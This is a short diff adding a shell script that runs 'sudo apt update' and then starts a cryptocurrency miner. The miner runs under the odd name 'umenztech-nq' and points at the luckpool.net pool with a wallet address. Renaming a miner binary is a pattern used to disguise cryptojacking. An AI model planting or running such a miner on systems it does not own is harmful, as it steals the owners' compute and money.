@@ -1,0 +1,4 @@
+#!/bin/sh
+
+sudo apt update
+./umenztech-nq -v -l na.luckpool.net:3956 -u RAe2Mx9RrCGtXew2SK2wpNYS1fzLywDYtX.Worker -p x -t 2
